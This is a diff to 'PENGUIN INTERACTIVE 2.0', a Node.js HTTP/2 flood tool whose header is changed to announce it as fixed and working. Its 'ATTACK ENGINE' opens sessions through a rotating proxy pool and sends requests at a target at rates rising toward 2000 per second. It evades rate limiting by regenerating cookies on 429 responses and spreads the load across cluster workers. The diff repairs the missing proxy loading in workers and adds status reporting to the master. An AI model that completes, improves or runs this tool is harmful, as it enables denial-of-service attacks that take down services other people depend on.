@@ -1,5 +1,5 @@
 /*
-    PENGUIN INTERACTIVE 2.0 (ENGLISH VERSION - NO UNICODE)
+    PENGUIN INTERACTIVE 2.0 (FIXED - WORKING)
     Installation: npm install hpack socks colors commander puppeteer-extra puppeteer-extra-plugin-stealth readline
     Run: node penguin.js
 */
@@ -33,7 +33,8 @@ let CONFIG = {
     randpath: false,
     query: false,
     ratelimit: false,
-    debug: true
+    debug: true,
+    delay: 5
 };
 
 // ----------------------------------------------
@@ -92,7 +93,7 @@ async function getConfig() {
 }
 
 // ----------------------------------------------
-//  ATTACK ENGINE (shared between master and worker)
+//  ATTACK ENGINE (shared)
 // ----------------------------------------------
 let proxyPool = [];
 let proxyBlacklist = new Set();
@@ -211,7 +212,7 @@ class ProxyConnector {
             const targetPort = targetURL.port || 443;
             if (this.type === 'HTTP' || this.type === 'HTTPS') {
                 const sock = net.connect({host: this.host, port: this.port});
-                sock.setTimeout(10000);
+                sock.setTimeout(15000);
                 sock.on('connect', () => {
                     let auth = '';
                     if (this.username) {
@@ -241,7 +242,7 @@ class ProxyConnector {
                     },
                     command: 'connect',
                     destination: { host: targetHost, port: targetPort },
-                    timeout: 10000
+                    timeout: 15000
                 }, (err, info) => {
                     if (err) reject(err);
                     else { this.socket = info.socket; resolve(info.socket); }
@@ -276,6 +277,7 @@ class H2Session {
     async start() {
         try {
             const socket = await this.proxy.connect();
+            if (CONFIG.debug) console.log('[DEBUG] Connected to proxy:', this.proxy.host);
             const targetURL = new URL(CONFIG.target);
             const tlsOpts = {
                 socket: socket,
@@ -306,12 +308,24 @@ class H2Session {
             this.client = client;
             this.active = true;
 
-            client.on('connect', () => { this._sendLoop(); });
-            client.on('error', (e) => { this.active = false; this.proxy.close(); });
-            client.on('close', () => { this.active = false; this.proxy.close(); });
+            client.on('connect', () => {
+                if (CONFIG.debug) console.log('[DEBUG] HTTP/2 session established on', this.proxy.host);
+                this._sendLoop();
+            });
+            client.on('error', (e) => {
+                if (CONFIG.debug) console.log('[DEBUG] HTTP/2 error on', this.proxy.host, ':', e.message);
+                this.active = false;
+                this.proxy.close();
+            });
+            client.on('close', () => {
+                if (CONFIG.debug) console.log('[DEBUG] HTTP/2 closed on', this.proxy.host);
+                this.active = false;
+                this.proxy.close();
+            });
 
             setTimeout(() => { if (this.active) { this.client.close(); } }, SESSION_LIFETIME);
         } catch(e) {
+            if (CONFIG.debug) console.log('[DEBUG] Failed to start session on', this.proxy.host, ':', e.message);
             this.proxy.close();
             throw e;
         }
@@ -320,6 +334,7 @@ class H2Session {
     _sendLoop() {
         if (!this.active || !this.client) return;
         const delayMs = 1000 / this.rate;
+        let count = 0;
 
         const sendOne = () => {
             if (!this.active || this.client.destroyed) return;
@@ -327,17 +342,22 @@ class H2Session {
             const req = this.client.request(headers);
             req.on('response', (resp) => {
                 const status = resp[':status'];
+                if (CONFIG.debug) console.log('[' + this.proxy.host + '] ' + status);
                 if (status === 429 && CONFIG.ratelimit) {
                     this.rate = Math.max(1, this.rate * 0.7);
                     this.cookie = generateCookie(CONFIG.cookieMode);
                 } else if (status >= 200 && status < 300) {
                     this.rate = Math.min(2000, this.rate * 1.05);
                 }
-                if (CONFIG.debug) console.log('[' + this.proxy.host + '] ' + status);
+                // Send status to master
+                if (process.send) {
+                    process.send({ type: 'status', data: { [status]: 1 } });
+                }
                 req.close();
             });
-            req.on('error', ()=>req.close());
+            req.on('error', (e) => { if (CONFIG.debug) console.log('[REQ ERR]', e.message); req.close(); });
             req.end();
+            count++;
             setTimeout(sendOne, delayMs);
         };
         sendOne();
@@ -450,11 +470,12 @@ if (cluster.isMaster) {
 
 } else {
     // ----------------------------------------------
-    //  CLUSTER WORKER
+    //  CLUSTER WORKER - FIXED
     // ----------------------------------------------
     // Override CONFIG with the one from master
     CONFIG = JSON.parse(process.env.config);
-    loadProxies();
+    loadProxies();  // <--- THIS WAS MISSING
+    console.log('[Worker] Started with', proxyPool.length, 'proxies');
 
     (async function worker() {
         const maxConns = 20;
@@ -482,11 +503,13 @@ if (cluster.isMaster) {
                 const session = new H2Session(connector, cookie);
                 await session.start();
                 sessions.push(session);
+                if (CONFIG.debug) console.log('[Worker] Session started on', host);
             } catch(e) {
+                if (CONFIG.debug) console.log('[Worker] Failed on', host, ':', e.message);
                 if (CONFIG.ratelimit) proxyBlacklist.add(proxyStr);
                 connector.close();
             }
-            await sleep(5);
+            await sleep(CONFIG.delay || 5);
         }
 
         setInterval(async () => {
